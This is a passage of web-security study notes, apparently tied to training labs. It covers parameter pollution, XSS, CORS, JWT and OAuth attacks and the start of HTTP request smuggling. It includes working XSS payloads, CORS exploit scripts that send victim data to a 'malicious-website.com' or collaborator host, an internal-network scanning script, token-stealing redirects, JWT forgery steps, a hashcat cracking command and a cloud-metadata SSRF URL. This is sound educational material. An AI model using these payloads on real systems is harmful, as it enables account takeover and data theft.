		* Param miner BApp - automatically guesses names relevant to the application, based on information taken from the scope.
		* Content discovery tool
	- Mass assignment vulnerabilities
		* Identifying hidden parameters - examine objects returned by the API. 
		* Lab - Identify the hidden parameters using other API's and modify the target API to purchase the product. (modify price or discount %)
	- Server-side parameter pollution
		* Occurs when a website embeds user input in server-side request to an internal API without adequate encoding
		* Enables attacker to:
			Override existing parameters.
			Modify the application behavior.
			Access unauthorized data.
	- Testing for server-side parameter pollution in the query string
		* Place query syntax characters like #, &, and = in your input and observe
		* Truncate query strings
			% Essential to URL-encode # character, else the front-end app will interpret it as a fragment identifier and won't be passed to the internal API 
		* Injecting invalid parameters
			% URL-encoded '&' character in attempt to add a second parameter to the server-side request.
		* Injecting valid parameters
			% Use param miner, content discovery to isentufy a valid parameter and pass a value
		* Overriding existing parameters
			% Try to override the original parameter
			% eg: GET /userSearch?name=peter%26name=carlos&back=/home
		* Lab - Identify the endpoint vulnerable to parameter pollution by using above methods. Observe the response revaling info about any parms missing in the response. Look for any parms such as reset token, password or email that the backend server would accept and provide a value.
	- Testing for server-side parameter pollution in REST paths
		* Uses parameters values along with url
		* eg: GET /edit_profile.php?name=peter (webapp), GET /api/private/users/peter (converted server side request)
		* Leverage the path traversal technique to access other users
		* Lab - Perform path traversal and observe error message "Invalid route". Traverse to the end and access the 'openapi.json' documentation file to view contents. Adjust the field to contain reset token or something that is relevant. Observe still we are unabel to obtain the value due to current API version. Traverse to an old/newer version(../../) that might provide the value. (make sure to use encoded # to fragment the trailing path)
	- Testing for server-side parameter pollution in structured data formats
		* If allowed to update the name, which invokes backend request, we can modify the request to include additional params like role, access_level etc taht would escalate our privileges.
		* When appending additional parms we need to follow the syntax. Use \" when required so that backend request would work without any syntax error.
		* eg: name=peter","access_level":"administrator  or {"name": "peter\",\"access_level\":\"administrator"}
		* According to the content-type used modify payload appropriately
	- Testing with automated tools
		* Burp Scanner,  Backslash Powered Scanner BApp

**********************************************************************************************************************************************************************************


---------------------------------------------------------------------------------Client-Side Attacks------------------------------------------------------------------------------

Cross-site scripting
	* allows an attacker to compromise the interactions that users have with a vulnerable application
	* Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data.
	* cross-origin iframes are prevented from calling alert() in google chrome, alternative for it is the print()
	* Reflected XSS, where the malicious script comes from the current HTTP request
	* Stored XSS, where the malicious script comes from the website's database. 
	* DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
	- Impact of reflected XSS attacks
		* Perform any action within the application that the user can perform.
    		* View any information that the user is able to view.
    		* Modify any information that the user is able to modify.
    		* Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

	- Reflected XSS
	    * Reflected XSS into HTML context with nothing encoded
		- basic example of xss 
		- payload <script>alert(1);</script>
		- provide the payloads in any entry point such as parameters, request body, url-parameters, HTTP Headers etc
	- Stored cross-site scripting
	    * Stored XSS into HTML context with nothing encoded
		  - basic example same payload as above
	- DOM-based cross-site scripting
	    * need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript
	    * most common source for DOM XSS is the URL, which is typically accessed with the window.location object.
	    * DOM - is a web browser's hierarchical representation of the elements on the page.
	    * Source is a JavaScript property that accepts data that is potentially attacker-controlled. eg location.search property because it reads input from the query string
	    * Sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. Eg eval() function
	  Common sources
		document.URL
		document.documentURI
		document.URLUnencoded
		document.baseURI
		location
		document.cookie
		document.referrer
		window.name
		history.pushState
		history.replaceState
		localStorage
		sessionStorage
		IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
		Database
	Comman Sinks
		document.write()
		document.writeln()
		document.domain
		element.innerHTML
		element.outerHTML
		element.insertAdjacentHTML
		element.onevent
	  jQuery Sinks
		add()
		after()
		append()
		animate()
		insertAfter()
		insertBefore()
		before()
		html()
		prepend()
		replaceAll()
		replaceWith()
		wrap()
		wrapInner()
		wrapAll()
		has()
		constructor()
		init()
		index()
		jQuery.parseHTML()
		$.parseHTML()
	DOM XSS combined with reflected and stored data
		- Reflected DOM XSS
			* makes use of json code to reflect the payload
			* payload = \"-alert(1);}// (\ used to escape the double-quotes being provided auto)
		- Stored DOM XSS
			* go through the JavaScript code to determine how the inputs from user are being handled, whether the code checks any characters which is sanitized and displayed safely
			* look for any methods that can bypass these checks
			* payload <><img src=1 onerror=alert(1)> (code encodes the first occurrence of angle brackets)
		- Controlling the web message source
		  * DOM XSS using web messages
			- <script>window.addEventListener('message', function(e) { eval(e.data); });</script> **vulnerable code**
			- <iframe src="https://vulnerable-website-url/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"> **payload**
		  * DOM XSS using web messages and a JavaScript URL
			- <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                     </script>
			- <iframe src="https://vulnerable-website-url/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"> **payload**
	Testing HTML sinks - provide malicious string in a vulnerable source and search for it in the dev tool option
	Testing JavaScript execution sinks input string doesn't appear in DOM - make use of JavaScript debugger.
	Testing for DOM XSS using DOM Invader
	DOM XSS in document.write sink using source location.search
		Payload - "><svg onload=alert(1)>
	DOM XSS in document.write sink using source location.search inside a select element
		Introduce a new URL query parameter 
		Payload - "></select><img+src=1+onerror=alert(1)>
	DOM XSS in innerHTML sink using source location.search
		The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe.
	DOM XSS in jQuery

**********************************************************************************************************************************************************************************

Cross-origin resource sharing (CORS)

	- Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP).
	-Same-origin policy --restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.
	- A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).
	- Various headers used in the response (origin, credentials, headers, methods)
	- From a security perspective, the use of the wildcard is restricted in the specification as you cannot combine the wildcard with the cross-origin transfer of credentials (authentication, cookies or client-side certificates).
	- Pre-Flight Checks - cross-origin request is preceded by a request using the OPTIONS method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request.

  * CORS vulnerability with basic origin reflection  (Server-generated ACAO header from client-specified Origin header)

	- script to be used : 
	- <html>
		<body>
			<script>
    				var req = new XMLHttpRequest();
    				req.onload = reqListener;
    				req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    				req.withCredentials = true;
    				req.send();

    				function reqListener() {
        				location='/log?key='+this.responseText;
    };
			</script>
		</body>
	 </html>
	- Test whether the Origin header reflects arbitrary value sent by user and is reflected in the response header Allow-Orgin along with Allow-Credentials. 

  * CORS vulnerability with trusted null origin

  	- Errors parsing Origin headers
		- Application might whitelist a set of domains and sub-domain(include inexistent as well) to compare (prefix/suffix comparison) with the Client specified Origin Header.(normalwebsite.com)
		- Can be bypassed by using (hackernormalwebsite.com, normalwebsite.evil.com)

  	- Whitelisted null origin value
		- Origin header supports the value null. Browsers might send null in Origin header in various situations:

			Cross-origin redirects.
			Requests from serialized data.
			Request using the file: protocol.
			Sandboxed cross-origin requests.
		- Application might whitelist 'null' to support local development
		- Bypassed using a iframe sandboxed cross-origin request
		- <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
		var req = new XMLHttpRequest();
		req.onload = reqListener;
		req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
		req.withCredentials = true;
		req.send();

		function reqListener() {
			location='https://malicious-website.com/log?key='+encodeURIComponent(this.responseText);
		};
		</script>"></iframe>

  * CORS vulnerability with trusted insecure protocols
	
	- Exploiting XSS via CORS trust relationships
		- If a application trusts any of its sub-domain that is vulnerable to XSS we can exploit CORS to get sensitive data from the application since the sub-domain is trusted(whitelisted).

	- Breaking TLS with poorly configured CORS
		- An application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP.
		- Steps The victim user makes any plain HTTP request.
			  The attacker injects a redirection to: http://trusted-subdomain.vulnerable-website.com
			  The victim's browser follows the redirect.
   			  The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: https://vulnerable-website.com
			  The victim's browser makes the CORS request, including the origin: http://trusted-subdomain.vulnerable-website.com
			  The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
			  The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
	- If an application trusts a vulnerable subdomain (XSS) we can exploit the CORS vuln in the actual application leveraging XSS vulnerability present in the trusted subdomain or url. (Test for HTTP and HTTPS protocols)

	- <script>
    		document.location="http://trusted-vulnerable-website.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://cors-misconfigured-website.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://collaborator -server.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
	</script>

  * CORS vulnerability with internal network pivot attack

	Step 1: <script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';

for(i=1;i<=255;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}

for(i=1;i<=20;i++){
	if(q.length)q.shift()(i*100);
}

function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r => r.text().then(text => {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
	}))
	.catch(e => {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x => {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
</script>

	Step 2 : <script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
	}))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>

	Step 3 : <script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
	fetch(url).then(r=>r.text().then(text=>
	{
		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
	}
	))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>

	Step 4 : <script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
	fetch(url).then(r=>r.text().then(text=>
	{
	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
	}
	))
}

fetchUrl("http://$ip");
</script>

**********************************************************************************************************************************************************************************


---------------------------------------------------------------------------------Advanced Attacks---------------------------------------------------------------------------------

JWT Attacks

	- JWTs are most commonly used in authentication, session management, and access control mechanisms, these vulnerabilities can potentially compromise the entire website and its users.
	- Unlike with classic session tokens, all of the data that a server needs is stored client-side within the JWT itself. This makes JWTs a popular choice for highly distributed websites where users need to interact seamlessly with multiple back-end servers.
	- A JWT consists of 3 parts: a header, a payload, and a signature.
	- The header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual "claims" about the user.
	-security of any JWT-based mechanism is heavily reliant on the cryptographic signature.
  * JWT vs JWS vs JWE
	- JSON Web Signature (JWS)(By default) and JSON Web Encryption (JWE)
	- JWE encrypts the contents
  * JWT attacks are used to impersonate as another user or escalate privileges who has already been authenticated.
  * How do vulnerabilities to JWT attacks arise?
	- signature of the JWT is not verified properly. 
  * Working with JWTs in Burp Suite
	- use JWT editor extender available in bapp store
  * Accepting arbitrary signatures
	- Node.js library jsonwebtoken has verify() and decode()
	- developers confuse these two methods and only pass incoming tokens to the decode() method.
  * Accepting tokens with no signature
	- the 'alg' parameter mentions the algorithm that was used to sign the token
	- if we change it to any other algorithm and sign it the server consider it legitimate and successfully can be bypassed.
	- we can also mention value for 'alg' parameter as none,None,nOne,noNe, etc.
	- make sure when alg is set to none or similar strings, remove the 3rd part ie signature from jwt and end with a "dot"
  * Brute-forcing secret keys
	- signing algorithms, such as HS256 (HMAC + SHA-256), use an arbitrary, standalone string as the secret key.
	- developers sometimes make mistakes like forgetting to change default or placeholder secrets.
	- https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
	- Brute-forcing secret keys using hashcat
	- You just need a valid, signed JWT from the target server and a wordlist of well-known secrets.
	- Command = hashcat -a 0 -m 16500 <jwt> <wordlist>
	- Hashcat signs the header and payload from the JWT using each secret in the wordlist, then compares the resulting signature with the original one from the server.
	- once the secret is obtained go to jwt editor keys -> select the key to generate -> no need to mention the key size auto adjusted -> generate -> modify 'k' value with base64 encoded secret obtained using hashcat -> apply
	- sign the token in repeater tab after modifying the payload -> when signing maintain 'don't modify header' depending on scenario
  * JWT header parameter injections
	- According to the JWS specification, only the alg header parameter is mandatory
    * Other parameters
	- jwk (JSON Web Key) - Provides an embedded JSON object representing the key.
	- jku (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.
	- kid (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching kid parameter.
    * these user-controllable parameters each tell the recipient server which key to use when verifying the signature.
  * Injecting self-signed JWTs via the jwk parameter
	- JSON Web Signature (JWS) specification describes an optional jwk header parameter, which servers can use to embed their public key directly within the token itself in JWK format.
	- example
		{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    		}
	}
	- servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigured servers sometimes use any key that's embedded in the jwk parameter.
	- exploit this behavior by signing a modified JWT using your own RSA private key, then embedding the matching public key in the jwk header.
	- Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.
  * Injecting self-signed JWTs via the jku parameter
	- servers let you use the jku (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.
	- example 
		{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        	}
    	   ]
	} 
	- JWK Sets like this are sometimes exposed publicly via a standard endpoint, such as /.well-known/jwks.json.
	- generate a new key -> copy public key as jwk and serve remotely by hosting a server > in jwt modify the kid parameter to match the new key generated and inject jku parameter to fetch the remotely stored public key using URL
  * Injecting self-signed JWTs via the kid parameter
	- might use the kid parameter to point to a particular entry in a database, or even the name of a file.
	- If this parameter is also vulnerable to directory traversal, an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.
	- example
		{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
	}
	- You could theoretically do this with any file, but one of the simplest methods is to use /dev/null, which is present on most Linux systems. As this is an empty file, fetching it returns null. Therefore, signing the token with a Base64-encoded null byte will result in a valid signature.
	- If the server stores its verification keys in a database, the kid header parameter is also a potential vector for SQL injection attacks.
	- generate a symmetric key -> change the value of 'k' to base64 encoded null byte (AA==) -> modify the kid param to contain the path (/dev/null) -> change payload params -> sign using generated symmetric key
  * Algorithm confusion attacks
	- Occur when attacker forces server to verify the signature of a JSON web token (JWT) using different algorithm than is intended by the website's developers.
	- Symmetric vs asymmetric algorithms
		* JWTs can be signed using 2 algorithms
			% HS256 (HMAC + SHA-256) ie "symmetric" key. Server uses single key to both sign and verify the token.
			% RS256 (RSA + SHA-256) use an "asymmetric" key pair.  Server uses private key to sign the token, and public key to verify the signature.
	- How do algorithm confusion vulnerabilities arise?
		* Confusion occurs when the JWT is signed using symmetric key but server supports both asymmetric & symmetric for verification. Attacker can use the public key obtained using the standard endpoint and sign the modified token after modifying the algorithm to HS256 so the server will use teh hardcoded public key as the HMAC secret key.
		* Can try vice-versa option
		* Public key you use to sign the token must be identical to the public key stored on server. This includes using same format (such as X.509 PEM) and preserving any non-printing characters like newlines.
	- Performing an algorithm confusion attack
		* Step 1 - Obtain the server's public key
			% Servers expose public keys as JSON Web Key (JWK) objects via /jwks.json or /.well-known/jwks.json
			% If the key isn't exposed publicly, you may be able to extract it from a pair of existing JWTs. (discussed in detail below)
		* Step 2 - Convert the public key to a suitable format
			% When verifying the signature of token, it will use its own copy of the key from local filesystem or DB that may be stored in a different format. 
			% In order for the attack to work, the version of the key that you use to sign the JWT must be identical to the server's local copy as well as every single byte must match.
			% Assume format is in X.509 PEM format
				$ With the JWT Editor extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.
				$ Click New RSA Key. In the dialog, paste the JWK that you obtained earlier.
				$ Select the PEM radio button and copy the resulting PEM key.
				$ Go to the Decoder tab and Base64-encode the PEM.
				$ Go back to the JWT Editor Keys tab and click New Symmetric Key.
				$ In the dialog, click Generate to generate a new key in JWK format.
				$ Replace the generated value for the k parameter with a Base64-encoded PEM key that you just copied. (Do not remove the newline)
				$ Save the key.
		* Step 3 - Modify your JWT
			% Once you have the public key in suitable format, modify the JWT however you like. Make sure the alg header is set to HS256.
		* Step 4 - Sign the JWT using the public key
			% Sign the token using the HS256 algorithm with the RSA public key as the secret.
		* Lab - Follow the above steps to perform algorithm confusion attacks
  * Deriving public keys from existing tokens
	- Tools such as jwt_forgery.py or https://github.com/silentsignal/rsa_sign2n
	- Simplified version - "docker run --rm -it portswigger/sig2n <token1> <token2>"
	- Uses the JWTs that you provide to calculate one or more potential values of 'n'
	- For each potential value, our script outputs:
		% A Base64-encoded PEM key in both X.509 and PKCS1 format.
		% A forged JWT signed using each of these keys.
	- To identify correct key, use Repeater to send request containing each of the forged JWTs. Only one of these will be accepted by the server. Use the matching key to construct an alg confusion attack.


**********************************************************************************************************************************************************************************

OAuth 2.0 authentication
	* Authorization framework that enables websites/web applications to request limited access to a user's account on another application.
	* Users can determine what data to be shared without exposing login creds.
	- How does OAuth 2.0 work?
		* Client application - The website/web application that wants to access the user's data.
		* Resource owner - The user whose data the client application wants to access.
		* OAuth service provider - The application that controls the user's data and access to it. Provides an API for interacting with both an authorization server & resource server.
	- What is an OAuth grant type?
		* OAuth grant type determines the exact sequence of steps that are involved in the OAuth process.
		* OAuth service must be configured to support particular grant type before  client app can initiate the flow. Client application specifies which grant type it prefers in the initial authorization request. 
	- OAuth scopes
		* Uses 'scope' parameter to specify the data it wants to access and what kind of operation it does on the data.
		* eg: scope=contacts, scope=contacts.read or might provide the full URI
	- Authorization code grant type
		1. Authorization request (via user browser)
			* Client application sends request to the OAuth service's "/authorization" endpoint asking permission to access user data.
			* eg: /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24
			* client_id -> unique identifier of client app
			* redirect_uri -> user's browser should be redirected when sending the authorization code to client application
			* response_type -> response expected and also determines the flow to initiate. If authorization code grant type, it should be "code".
			* scope -> specify the subset of data client wants to access.
			* state -> Stores a unique, unguessable value that is tied to the current session on the client application which has an expiry. Acts as a CSRF token.
		2. User login and consent
			* When the authorization server receives the initial request, it will redirect user to a login page and asked to log in to their account with the OAuth provider.
		3. Authorization code grant (via user browser)
			* After user provide consent and authenticates, browser redirects to the URI mentioned in redirect_uri. (/callback)
			* Request will contain the auth 'code' and depending on config the 'state' params.
		4. Access token request (app server to oauth server)
			* Sends a server-to-server POST request to the OAuth /token endpoint. Communications from this point takes place in a secure channel & cannot be controlled by an attacker.
			* Body Params:  client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
		5. Access token grant
			* OAuth server validates and responds by granting the client app a access token which also has an expiry.
		6. API call
			* Client app fetches the user's data from OAuth server using access token.
		7. Resource grant
			* OAuth server verifies token and responds with the requested resource.
	- Implicit grant type (every communication happens via user's browser and can be observed by an attacker)
		* Client app receives the access token immediately after the user gives their consent.
		* Suited for single-page & native desktop apps, which cannot easily store the client_secret on the back-end.
		1. Authorization request
			* Same as authorization code grant type except the 'response_type' should be set to 'token'.
		2. User login and consent
			* When the authorization server receives the initial request, it will redirect user to a login page and asked to log in to their account with the OAuth provider.
		3. Access token grant
			* OAuth service will redirect the user's browser to the redirect_uri specified in the authorization request and sends the access token instead of auth code.
			* access token and other token-specific data are sent as a URL fragment. 
			* eg: /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24
		4. API call
			* Client app fetches the user's data from OAuth server using access token.
		5. Resource grant
			* OAuth server verifies token and responds with the requested resource.
	- OAuth authentication
		* Client application uses social media site's OAuth service to request access to some data that it can use to identify the user.
		* After receiving an access token, the client application requests this data from the resource server, typically from a dedicated /userinfo endpoint.
		* Once it has received the data, the client application uses it in place of a username to log the user in. The access token that it received is often used as password.
	- OAuth authentication vulnerabilities arise
		* Specification is relatively vague and flexible by design.
	- Identifying OAuth authentication
		* First request of the flow will always be a request to /authorization endpoint
		* Try sending a GET request to the following standard endpoints:
		/.well-known/oauth-authorization-server
		/.well-known/openid-configuration
	- Exploiting OAuth authentication vulnerabilities
   	  - Vulnerabilities in the client application
		* Improper implementation of the implicit grant type
			$ Lab- Uses an implicit grant type where once the oauth service provide the access token, an authenticate endpoint is called to the client app where the access token, username & email-id is passed to assign a session ID. This can be bypassed by changing the required fields to the victims ID to obtain a valid session.
		* Flawed CSRF protection (linking Social Media account to an existing account)
			$ "state" parameter should contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow
			$ Lab - Since "state" parameter is not used, when linking our social media account a CSRF attack can be performed by providing our link token to the victim and our social media account gets attached to the victim user's account.
   	  - Vulnerabilities in the OAuth service (Leak authorization codes & access tokens)
		* Flawed redirect_uri validation
			$ If the OAuth service fails to validate redirect_URI properly, an attacker can construct CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri
			$ Using state or nonce protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.
			$ More secure authorization servers will require a redirect_uri parameter to be sent when exchanging the code as well.
			$ Bypasses
				Try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
				Append extra values to the default redirect_uri parameter (https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/)
				Perform server-side parameter pollution where you add repeat the redirect_uri parameter and see which value does the OAUTh service validate and which is used to send the auth code.
				Change the response_mode from query to fragment can sometimes alter the parsing of the redirect_uri, allowing to submit URIs that was being blocked
			$ Lab - Modify the initial redirect_uri parameter in the /auth endpoint to contain attacker controlled domain and perform a CSRF attack which will send the Auth code to attacker's server.
		* Stealing codes and access tokens via a proxy page
			$ You may be able to use directory traversal tricks to supply any arbitrary path on the domain for redirect
			$ XSS vulnerabilities
			$ HTML injection - point redirect_uri parameter to a page where you can inject HTML content, we could leak code via the Referrer header. 
			eg: <img src="evil-user.net">. When attempting to fetch image, some browsers (Firefox) will send full URL in the Referrer header.			
			$ Lab - Modify the redirect_URI to contain an endpoint within the app that is vulnerable to open redirect which forces the OAUTH service to send the code/token to the attacker's server. Using the code/token we can exploit further. Bypass an redirect_URI check using directory traversal or other techniques.
			$  <script>
    				if (!document.location.hash) {
        				window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    				} else {
        				window.location = '/?'+document.location.hash.substr(1)
    				}
			</script>
			$ Lab- OAuth service is vulnerable to directory traversal. Here the client app allows web pages to be loaded in iframe which can be used to provide the OAuth url and modify the redirect_URI to contain a page within the client app and setup a event listener to send the URL contents to attacker's server.
			<iframe src='OAUTH_URL with modified redirect_URI'></iframe>
			<script>
				window.addEventListener('message', function(e) {
				fetch("/" + encodeURIComponent(e.data.data))
				}, false)
			</script>
	- Flawed scope validation
		* possible for attacker to "upgrade" an access token with extra permissions due to flawed validation by OAuth service
	- Scope upgrade: authorization code flow
		* Attacker's malicious client app initially requested access to user's email using scope. After user approves request, the malicious client application receives an authorization code. As the attacker controls client application, they can add another scope parameter to the code/token exchange request containing the additional "profile" scope.
		* If OAuth server does not validate against the initial authorization request, it generates access token with upgraded privilege.
	- Scope upgrade: implicit flow
		* Attacker can obtain the access token since all communication is passed via browser.
		* Attacker uses the token and sends request to OAuth service's /userinfo endpoint, manually adding new scope parameter
	- Unverified user registration
		* Client app makes the implicit assumption that the information stored by the OAuth provider is correct
		* Websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address
		* Attacker can exploit by registering an account with the OAuth provider using the same details as a target user, such as a known email address
	- Extending OAuth with OpenID Connect
		* OAuth is extended with an OpenID Connect layer, which provides some additional features related to identifying and authenticating user
	- Authorization codes - they may be leaked via Referrer headers when external images, scripts, or CSS content is loaded.
	- What is OpenID Connect?
		* OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer
		* OAuth was not initially designed with authentication in mind; it was intended to be means of delegating authorizations for specific resources between applications
	- How does OpenID Connect work?
		*  From client app's perspective, key difference is that there is an additional, standardized set of scopes that are same for all providers, and an extra response type: id_token. 
	- OpenID Connect roles
		* Relying party - The application that is requesting authentication of a user. This is synonymous with the OAuth client application.
		* End user - The user who is being authenticated. This is synonymous with the OAuth resource owner.
		* OpenID provider - An OAuth service that is configured to support OpenID Connect.
	- OpenID Connect claims and scopes
		* "claims" refer to the key:value pairs that represent information about user on the resource server
		* In order to use OpenID Connect, the client application must specify the scope openid in the authorization request
	- ID token
		* Returns a JSON web token (JWT) signed with a JSON web signature (JWS).
		* JWT payload contains list of claims based on scope initially requested. Also contains info about how & when the user last authenticated by the OAuth service
		* eg: response_type=id_token token/code
	- Identifying OpenID Connect
		* Look for the keyword 'openid' in scope (eg: openid profile/email.address/phone)
		* Try adding the 'openid' scope or changing the response type to 'id_token' and observing whether this results in an error. 
		* Access config fie - /.well-known/openid-configuration
	- Vulnerability - Unprotected dynamic client registration
		* If dynamic client registration is supported, the client app can register itself by sending a POST request to a dedicated /registration endpoint. (endpoint details available in config file/documentation)
		* Request body would contain multiple info such as allowed redirect_uri, client app name, endpoints to expose etc
		* Some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application (usually should contain bearer token along with request)
		* Few params send in request body as json: application_type, redirect_uris, client_name, logo_uri, token_endpoint_auth_method, jwks_uri, userinfo_encrypted_response_alg, userinfo_encrypted_response_alg
		* Possibility of second-order SSRF since we provide few URI's for logo, jwks etc.
		* Lab - Find the config file in OAuth server to obtain register endpoint. Try sending POST request and craft a body with redirect_uris and logo_uri params to register a client. The OAuth server registers a client app and provides the client ID with the logo_uri attacker assigns ie collaborator/metadata link. Since the OAuth server would try accessing the logo from the server we mention with a valid client_id, it's vulnerable to SSRF. (Send fetch logo request to OAuth server and at the backend the server would try fetch the logo from the URI client provided when registering). Obtain metadata - http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
	- Vulnerability - Allowing authorization requests by reference (SSRF)
		* Some OpenID providers give option to pass the query params passed in the auth request as a JSON web token (JWT)
		* If enabled, send a single request_uri parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values
		* Can use this technique to bypass the validation of other parameters
		* To check whether enabled, look for the request_uri_parameter_supported option in the configuration file and documentation.
		* Alternatively, try adding just the request_uri parameter to see if it works.

**********************************************************************************************************************************************************************************

HTTP request smuggling
	- Interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.
	- Allows attacker to bypass security controls, gain unauthorized access to sensitive data, & compromise other application users
	- Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable.
	- When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection
	- How do HTTP request smuggling vulnerabilities arise?
		* Provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.
		* Possible for a single message to use both methods at once, such that they conflict with each other.
		* If both Content-Length and Transfer-Encoding headers are present, then Content-Length header should be ignored
	- How to perform an HTTP request smuggling attack
		* CL.TE: front-end server uses Content-Length header and back-end server uses Transfer-Encoding header.
		* TE.CL: front-end server uses Transfer-Encoding header and back-end server uses Content-Length header.
		* TE.TE: front-end and back-end servers both support Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header.
	- Involves sending two requests to the application in quick succession: (create separate tabs)
		$ An "attack" request, designed to interfere with processing of the next request.
		$ A "normal" request.
